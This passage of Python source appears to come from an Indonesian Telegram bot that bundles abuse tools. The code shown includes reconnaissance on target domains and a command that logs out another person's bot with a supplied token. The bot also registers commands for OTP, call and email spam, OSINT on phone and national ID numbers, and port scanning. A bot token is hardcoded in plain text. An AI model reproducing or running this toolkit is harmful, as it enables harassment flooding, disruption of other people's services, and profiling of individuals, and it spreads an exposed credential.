                    format_success(
                        "𝐈𝐌𝐄𝐈 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
                        f"📌 IMEI: `{imei}`\n"
                        f"📱 Model: {data.get('Item1', 'N/A')}\n"
                        f"🏷️ Brand: {data.get('Item3', 'N/A')}"
                    ),
                    parse_mode=ParseMode.MARKDOWN
                )
            else:
                update.message.reply_text(f"❌ IMEI `{imei}` tidak ditemukan")
        except Exception as e:
            update.message.reply_text(format_error(str(e)))

    def cmd_cek_phising(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_verified(user_id):
            update.message.reply_text("❌ *Akses Ditolak!*")
            return

        args = context.args
        if not args:
            update.message.reply_photo(
                photo=IMAGE,
                caption=(
                    f"𝙏𝙊𝙊𝙇𝙎: 𝐂𝐄𝐊 𝐋𝐈𝐍𝐊 𝐏𝐇𝐈𝐒𝐈𝐍𝐆\n"
                    f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
                    f"/cekphising https://example.com"
                ),
                parse_mode=ParseMode.MARKDOWN
            )
            return

        url = args[0].strip()
        if not url.startswith('http'):
            url = 'https://' + url

        update.message.reply_text(format_loading("Mengecek URL Phising"))

        try:
            data = tool_web_phising_checker(url)
            if data:
                status = "⚠️ Terdeteksi PHISING!" if data.get('is_phishing') else "✅ Aman"
                update.message.reply_text(
                    format_success(
                        "𝐂𝐄𝐊 𝐋𝐈𝐍𝐊 𝐏𝐇𝐈𝐒𝐈𝐍𝐆 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
                        f"🔗 URL: {url[:60]}...\n"
                        f"📌 Status: {status}\n"
                        f"🛡️ Malware: {'⚠️ Terdeteksi' if data.get('contains_malware') else '✅ Aman'}"
                    ),
                    parse_mode=ParseMode.MARKDOWN
                )
            else:
                update.message.reply_text("❌ Gagal mengecek URL")
        except Exception as e:
            update.message.reply_text(format_error(str(e)))

    def cmd_web_recon(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_verified(user_id):
            update.message.reply_text("❌ *Akses Ditolak!*")
            return

        args = context.args
        if not args:
            update.message.reply_photo(
                photo=IMAGE,
                caption=(
                    f"𝙏𝙊𝙊𝙇𝙎: 𝐖𝐄𝐁 𝐑𝐄𝐂𝐎𝐍𝐍𝐀𝐈𝐒𝐒𝐀𝐍𝐂𝐄\n"
                    f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
                    f"/webrecon google.com"
                ),
                parse_mode=ParseMode.MARKDOWN
            )
            return

        domain = args[0].strip().replace('http://', '').replace('https://', '').replace('www.', '').split('/')[0]
        update.message.reply_text(format_loading("Melakukan Web Reconnaissance"))

        try:
            data = tool_web_recon(domain)
            if data:
                update.message.reply_text(
                    format_success(
                        "𝐖𝐄𝐁 𝐑𝐄𝐂𝐎𝐍 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
                        f"🌍 Domain: `{data['domain']}`\n"
                        f"📌 IP: `{data['ip']}`\n"
                        f"🔍 Subdomain: {data['total_subs']} ditemukan\n"
                        f"🔌 Port terbuka: {', '.join(map(str, data['open_ports'])) if data['open_ports'] else 'Tidak ada'}\n\n"
                        f"📋 *Subdomain sample:*\n" + "\n".join(data['subdomains'][:10]) if data['subdomains'] else "Tidak ada subdomain"
                    ),
                    parse_mode=ParseMode.MARKDOWN
                )
            else:
                update.message.reply_text(f"❌ Gagal reconnaissance untuk `{domain}`")
        except Exception as e:
            update.message.reply_text(format_error(str(e)))

    def cmd_lapor_bug(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_verified(user_id):
            update.message.reply_text("❌ *Akses Ditolak!*")
            return

        update.message.reply_photo(
            photo=IMAGE,
            caption=(
                f"𝙏𝙊𝙊𝙇𝙎: 𝐋𝐀𝐏𝐎𝐑 𝐁𝐔𝐆\n"
                f"𝘿𝙀𝙑𝙀𝙇𝙊𝙋: 𝐑𝐮𝐥𝐥𝐳𝐳𝐳𝟎𝟔\n\n"
                f"𝙇𝙖𝙥𝙤𝙧𝙠𝙖𝙣 𝙗𝙪𝙜 𝙠𝙚 𝙖𝙙𝙢𝙞𝙣:\n"
                f"https://wa.me/+6283832110509"
            ),
            parse_mode=ParseMode.MARKDOWN
        )

    def cmd_foto_tourl(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_verified(user_id):
            update.message.reply_text("❌ *Akses Ditolak!*")
            return

        update.message.reply_photo(
            photo=IMAGE,
            caption=(
                f"𝙏𝙊𝙊𝙇𝙎: 𝐅𝐎𝐓𝐎/𝐕𝐈𝐃𝐄𝐎 𝐓𝐎 𝐔𝐑𝐋\n"
                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
                f"Kirim file foto/video (max 200MB)"
            ),
            parse_mode=ParseMode.MARKDOWN
        )
        context.user_data['state'] = 'upload_photo'

    def cmd_file_tourl(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_verified(user_id):
            update.message.reply_text("❌ *Akses Ditolak!*")
            return

        update.message.reply_photo(
            photo=IMAGE,
            caption=(
                f"𝙏𝙊𝙊𝙇𝙎: 𝐅𝐈𝐋𝐄 𝐓𝐎 𝐔𝐑𝐋\n"
                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
                f"Kirim file (max 10GB)"
            ),
            parse_mode=ParseMode.MARKDOWN
        )
        context.user_data['state'] = 'upload_file'

    def cmd_kill_bottele(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_verified(user_id):
            update.message.reply_text("❌ *Akses Ditolak!*")
            return

        args = context.args
        if not args:
            update.message.reply_photo(
                photo=IMAGE,
                caption=(
                    f"𝙏𝙊𝙊𝙇𝙎: 𝐊𝐈𝐋𝐋 𝐁𝐎𝐓 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌\n"
                    f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
                    f"/killbottele 1234567890:ABCdef"
                ),
                parse_mode=ParseMode.MARKDOWN
            )
            return

        token = args[0].strip()
        update.message.reply_text(format_loading("Membunuh Bot Telegram"))

        try:
            url = f'https://api.telegram.org/bot{token}/logOut'
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                if data.get('ok'):
                    update.message.reply_text(
                        format_success(
                            "𝐊𝐈𝐋𝐋 𝐁𝐎𝐓 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
                            f"✅ Bot berhasil dimatikan!"
                        ),
                        parse_mode=ParseMode.MARKDOWN
                    )
                else:
                    update.message.reply_text("❌ Token bot tidak valid")
            else:
                update.message.reply_text("❌ Gagal mematikan bot")
        except Exception as e:
            update.message.reply_text(format_error(str(e)))

    def cmd_cek_infobot(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_verified(user_id):
            update.message.reply_text("❌ *Akses Ditolak!*")
            return

        args = context.args
        if not args:
            update.message.reply_photo(
                photo=IMAGE,
                caption=(
                    f"𝙏𝙊𝙊𝙇𝙎: 𝐂𝐄𝐊 𝐈𝐍𝐅𝐎 𝐁𝐎𝐓\n"
                    f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
                    f"/cekinfobot 1234567890:ABCdef"
                ),
                parse_mode=ParseMode.MARKDOWN
            )
            return

        token = args[0].strip()
        update.message.reply_text(format_loading("Mengambil Info Bot"))

        try:
            url = f'https://api.telegram.org/bot{token}/getMe'
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                if data.get('ok'):
                    result = data.get('result', {})
                    update.message.reply_text(
                        format_success(
                            "𝐈𝐍𝐅𝐎 𝐁𝐎𝐓 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
                            f"🆔 ID: `{result.get('id', 'N/A')}`\n"
                            f"👤 Nama: {result.get('first_name', 'N/A')}\n"
                            f"🔗 Username: @{result.get('username', 'N/A')}"
                        ),
                        parse_mode=ParseMode.MARKDOWN
                    )
                else:
                    update.message.reply_text("❌ Token bot tidak valid")
            else:
                update.message.reply_text("❌ Gagal mengambil info bot")
        except Exception as e:
            update.message.reply_text(format_error(str(e)))

    def cmd_shortener_url(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_verified(user_id):
            update.message.reply_text("❌ *Akses Ditolak!*")
            return

        args = context.args
        if not args:
            update.message.reply_photo(
                photo=IMAGE,
                caption=(
                    f"𝙏𝙊𝙊𝙇𝙎: 𝐋𝐈𝐍𝐊 𝐒𝐇𝐎𝐑𝐓𝐄𝐍𝐄𝐑\n"
                    f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
                    f"/shortenerurl https://www.tokopedia.com"
                ),
                parse_mode=ParseMode.MARKDOWN
            )
            return

        url = args[0].strip()
        if not url.startswith('http'):
            url = 'https://' + url

        update.message.reply_text(format_loading("Memendekkan URL"))

        try:
            result = tool_link_shortener(url)
            if result:
                update.message.reply_text(
                    format_success(
                        "𝐋𝐈𝐍𝐊 𝐒𝐇𝐎𝐑𝐓𝐄𝐍𝐄𝐑 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
                        f"🔗 URL Pendek: {result}\n"
                        f"📎 URL Asli: {url[:60]}..."
                    ),
                    parse_mode=ParseMode.MARKDOWN
                )
            else:
                update.message.reply_text("❌ Gagal memendekkan URL")
        except Exception as e:
            update.message.reply_text(format_error(str(e)))

    def cmd_hack_status_wa(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_verified(user_id):
            update.message.reply_text("❌ *Akses Ditolak!*")
            return

        update.message.reply_photo(
            photo=IMAGE,
            caption=(
                f"𝙏𝙊𝙊𝙇𝙎: 𝐇𝐀𝐂𝐊 𝐒𝐓𝐀𝐓𝐔𝐒 𝐖𝐀\n"
                f"𝘿𝙀𝙑𝙀𝙇𝙊𝙋: 𝐑𝐮𝐥𝐥𝐳𝐳𝐳𝟎𝟔\n\n"
                f"𝙋𝙖𝙨𝙩𝙞𝙠𝙖𝙣 𝙒𝙝𝙖𝙩𝙨𝘼𝙥𝙥 𝙩𝙚𝙧𝙞𝙣𝙨𝙩𝙖𝙡𝙡\n"
                f"𝙙𝙖𝙣 𝙨𝙪𝙙𝙖𝙝 𝙢𝙚𝙢𝙗𝙪𝙠𝙖 𝙨𝙩𝙖𝙩𝙪𝙨.\n\n"
                f"𝙃𝙖𝙨𝙞𝙡 𝙖𝙠𝙖𝙣 𝙙𝙞𝙨𝙞𝙢𝙥𝙖𝙣 𝙙𝙞 𝙛𝙤𝙡𝙙𝙚𝙧 Status_WA"
            ),
            parse_mode=ParseMode.MARKDOWN
        )

    def cmd_cek_resi(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_verified(user_id):
            update.message.reply_text("❌ *Akses Ditolak!*")
            return

        args = context.args
        if not args or len(args) < 2:
            update.message.reply_photo(
                photo=IMAGE,
                caption=(
                    f"𝙏𝙊𝙊𝙇𝙎: 𝐂𝐄𝐊 𝐑𝐄𝐒𝐈\n"
                    f"𝙁𝙤𝙧𝙢𝙖𝙩:\n"
                    f"/cekresi kurir nomorresi\n\n"
                    f"Kurir: jne, jnt, sicepat, anteraja, pos, tiki, shopee\n"
                    f"Contoh: /cekresi jne 1234567890"
                ),
                parse_mode=ParseMode.MARKDOWN
            )
            return

        courier = args[0].strip().lower()
        awb = args[1].strip()

        update.message.reply_text(format_loading("Mencari Resi"))

        try:
            data = tool_cek_resi(courier, awb)
            if data:
                history = data.get('history', [])
                history_text = ""
                for h in history[-5:]:
                    history_text += f"📅 {h.get('date', '')} → {h.get('desc', '')}\n"

                update.message.reply_text(
                    format_success(
                        "𝐂𝐄𝐊 𝐑𝐄𝐒𝐈 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
                        f"📮 Resi: `{data.get('awb', 'N/A')}`\n"
                        f"📦 Kurir: {data.get('courier', 'N/A').upper()}\n"
                        f"📌 Status: {data.get('status', 'N/A')}\n\n"
                        f"📋 *Riwayat:*\n{history_text or 'Belum ada riwayat'}"
                    ),
                    parse_mode=ParseMode.MARKDOWN
                )
            else:
                update.message.reply_text(f"❌ Resi `{awb}` tidak ditemukan")
        except Exception as e:
            update.message.reply_text(format_error(str(e)))

    def cmd_get_id_chat(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_verified(user_id):
            update.message.reply_text("❌ *Akses Ditolak!*")
            return

        args = context.args
        if not args:
            update.message.reply_photo(
                photo=IMAGE,
                caption=(
                    f"𝙏𝙊𝙊𝙇𝙎: 𝐆𝐄𝐓 𝐈𝐃 𝐂𝐇𝐀𝐓\n"
                    f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
                    f"/getidchatbot 1234567890:ABCdef"
                ),
                parse_mode=ParseMode.MARKDOWN
            )
            return

        token = args[0].strip()
        update.message.reply_text(format_loading("Mengambil ID Chat Bot"))

        try:
            url = f'https://api.telegram.org/bot{token}/getMe'
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                if data.get('ok'):
                    result = data.get('result', {})
                    update.message.reply_text(
                        format_success(
                            "𝐆𝐄𝐓 𝐈𝐃 𝐂𝐇𝐀𝐓 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
                            f"🆔 Bot ID: `{result.get('id', 'N/A')}`\n"
                            f"👤 Nama: {result.get('first_name', 'N/A')}\n"
                            f"🔗 Username: @{result.get('username', 'N/A')}"
                        ),
                        parse_mode=ParseMode.MARKDOWN
                    )
                else:
                    update.message.reply_text("❌ Token bot tidak valid")
            else:
                update.message.reply_text("❌ Gagal mengambil ID bot")
        except Exception as e:
            update.message.reply_text(format_error(str(e)))
            
from flask import Flask, request
import asyncio
import json
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
BOT_TOKEN = "8685515038:AAEW_N4J98oYLIMpP71Fc9W99ha7nR4mJAs"

@app.route("/webhook", methods=["POST"])
def webhook():
    try:
        data = request.get_json()
        if not data:
            logger.error("No JSON data")
            return {"status": "error"}, 400
        
        logger.info(f"Webhook: {data.get('message', {}).get('text', 'no text')}")
        
        update = Update.de_json(data, None)
        
        bot = MikasaBot(BOT_TOKEN)
        application = Application.builder().token(BOT_TOKEN).build()
        
        application.add_handler(CommandHandler("start", bot.start))
        application.add_handler(CommandHandler("register", bot.register))
        application.add_handler(CommandHandler("verify", bot.verify))
        application.add_handler(CommandHandler("spamotp", bot.cmd_spam_otp))
        application.add_handler(CommandHandler("spamcall", bot.cmd_spam_call))
        application.add_handler(CommandHandler("spampair", bot.cmd_spam_pair))
        application.add_handler(CommandHandler("spamrepwa", bot.cmd_spam_repwa))
        application.add_handler(CommandHandler("spamngl", bot.cmd_spam_ngl))
        application.add_handler(CommandHandler("osint", bot.cmd_osint))
        application.add_handler(CommandHandler("osintnomor", bot.cmd_osint_nomor))
        application.add_handler(CommandHandler("osintusername", bot.cmd_osint_username))
        application.add_handler(CommandHandler("osintip", bot.cmd_osint_ip))
        application.add_handler(CommandHandler("osintdomain", bot.cmd_osint_domain))
        application.add_handler(CommandHandler("iptracker", bot.cmd_ip_tracker))
        application.add_handler(CommandHandler("portscan", bot.cmd_port_scan))
        application.add_handler(CommandHandler("nikparse", bot.cmd_nik_parse))
        application.add_handler(CommandHandler("cekkodepos", bot.cmd_cek_kodepos))
        application.add_handler(CommandHandler("ceknpsn", bot.cmd_cek_npsn))
        application.add_handler(CommandHandler("ffuid", bot.cmd_ff_uid))
        application.add_handler(CommandHandler("cekroblox", bot.cmd_cek_roblox))
        application.add_handler(CommandHandler("spamgmail", bot.cmd_spam_gmail))
        application.add_handler(CommandHandler("cekdataguru", bot.cmd_cek_dataguru))
        application.add_handler(CommandHandler("spambottele", bot.cmd_spam_bottele))
        application.add_handler(CommandHandler("cekimei", bot.cmd_cek_imei))
        application.add_handler(CommandHandler("cekphising", bot.cmd_cek_phising))
        application.add_handler(CommandHandler("webrecon", bot.cmd_web_recon))
        application.add_handler(CommandHandler("laporbug", bot.cmd_lapor_bug))
        application.add_handler(CommandHandler("fototourl", bot.cmd_foto_tourl))
        application.add_handler(CommandHandler("filetourl", bot.cmd_file_tourl))
        application.add_handler(CommandHandler("killbottele", bot.cmd_kill_bottele))
        application.add_handler(CommandHandler("cekinfobot", bot.cmd_cek_infobot))
        application.add_handler(CommandHandler("shortenerurl", bot.cmd_shortener_url))
        application.add_handler(CommandHandler("hackstatuswa", bot.cmd_hack_status_wa))
        application.add_handler(CommandHandler("cekresi", bot.cmd_cek_resi))
        application.add_handler(CommandHandler("getidchatbot", bot.cmd_get_id_chat))
        application.add_handler(CallbackQueryHandler(bot.button_callback))
        application.add_handler(
            MessageHandler(
                filters.DOCUMENT | filters.PHOTO | filters.VIDEO,
                bot.handle_document
            )
        )
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(application.process_update(update))
        loop.close()
        
        logger.info("Update processed")
        return {"status": "ok"}, 200
        
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return {"status": "error", "error": str(e)}, 500

@app.route("/")
def index():
    return "Bot is running!", 200

if __name__ == "__main__":
    app.run()
